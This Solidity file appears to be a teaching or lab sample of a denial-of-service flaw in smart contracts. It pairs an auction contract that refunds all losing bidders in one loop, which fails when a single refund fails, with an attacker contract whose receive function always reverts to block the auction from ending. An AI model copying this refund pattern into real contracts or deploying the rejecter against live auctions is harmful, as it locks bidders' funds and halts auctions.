// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.28;


contract VulnerableAuction {
    mapping(address => uint256) public bids;
    address[] public bidders;
    address public highestBidder;
    uint256 public highestBid;

    event BidPlaced(address indexed bidder, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);

    function placeBid() external payable {
        require(msg.value > 0, "Bid must be greater than 0");

        if (bids[msg.sender] == 0) {
            bidders.push(msg.sender);
        }

        bids[msg.sender] += msg.value;

        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }

        emit BidPlaced(msg.sender, msg.value);
    }


    function endAuction() external {
        require(highestBidder != address(0), "No bids placed");

        for (uint256 i = 0; i < bidders.length; i++) {
            address bidder = bidders[i];

            if (bidder != highestBidder) {
                uint256 refundAmount = bids[bidder];
                bids[bidder] = 0;

                (bool success, ) = bidder.call{value: refundAmount}("");
                require(success, "Refund failed"); // PROBLEM: Entire function fails
            }
        }

        emit AuctionEnded(highestBidder, highestBid);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract MaliciousRejecter {
    VulnerableAuction public auction;

    constructor(address _auction) {
        auction = VulnerableAuction(_auction);
    }

    function attack() external payable {
        auction.placeBid{value: msg.value}();
    }

    // Reject all incoming payments - this blocks the auction
    receive() external payable {
        revert("I refuse to receive money!");
    }
}